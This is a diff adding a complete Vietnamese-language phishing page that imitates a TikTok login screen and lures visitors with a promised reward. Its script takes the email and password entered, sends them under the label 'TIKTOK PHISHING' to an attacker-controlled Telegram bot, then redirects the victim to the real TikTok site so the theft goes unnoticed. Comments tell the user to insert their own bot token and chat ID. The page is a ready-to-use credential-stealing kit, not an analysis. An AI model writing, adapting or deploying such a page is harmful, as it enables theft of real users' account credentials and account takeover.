@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Đăng nhập</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .box {
+            background: white;
+            padding: 40px 32px;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .box h1 {
+            font-size: 28px;
+            margin-bottom: 4px;
+            color: #161823;
+        }
+        .box .sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        .input-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #161823;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #f8f8f8;
+        }
+        .input-group input:focus {
+            border-color: #00f2ea;
+            outline: none;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #00f2ea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #00d4cc; }
+        .note {
+            font-size: 12px;
+            color: #999;
+            margin-top: 16px;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 8px;
+        }
+        #error {
+            color: #ff4d4f;
+            font-size: 13px;
+            background: #fff2f0;
+            padding: 8px;
+            border-radius: 8px;
+            display: none;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">🎵</div>
+        <h1>TikTok</h1>
+        <p class="sub">Đăng nhập để xem video độc quyền</p>
+        
+        <div id="error">Sai thông tin, vui lòng thử lại</div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Email hoặc số điện thoại</label>
+                <input type="text" id="email" placeholder="Nhập email hoặc SĐT" required>
+            </div>
+            <div class="input-group">
+                <label>Mật khẩu</label>
+                <input type="password" id="password" placeholder="Nhập mật khẩu" required>
+            </div>
+            <button type="submit" class="btn">Đăng nhập</button>
+        </form>
+        
+        <div class="note">🔒 Đăng nhập để nhận ngay 100k</div>
+    </div>
+
+    <script>
+        // ====== CODE GỬI DỮ LIỆU VỀ TELEGRAM ======
+        // THAY BẰNG TOKEN VÀ CHAT ID CỦA BẠN
+        
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";   // Lấy từ @BotFather
+        const CHAT_ID = "YOUR_CHAT_ID";       // Lấy từ getUpdates
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                document.getElementById('error').style.display = 'block';
+                return;
+            }
+            
+            // Gửi qua Telegram
+            var msg = "🎯 TIKTOK PHISHING\n";
+            msg += "═══════════════════\n";
+            msg += "📧 Email: " + email + "\n";
+            msg += "🔑 Pass: " + password + "\n";
+            msg += "═══════════════════\n";
+            
+            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+            url += "?chat_id=" + CHAT_ID;
+            url += "&text=" + encodeURIComponent(msg);
+            
+            fetch(url)
+                .then(function(response) {
+                    // Chuyển hướng đến TikTok thật
+                    window.location.href = "https://www.tiktok.com";
+                })
+                .catch(function() {
+                    window.location.href = "https://www.tiktok.com";
+                });
+        });
+    </script>
+</body>
+</html>
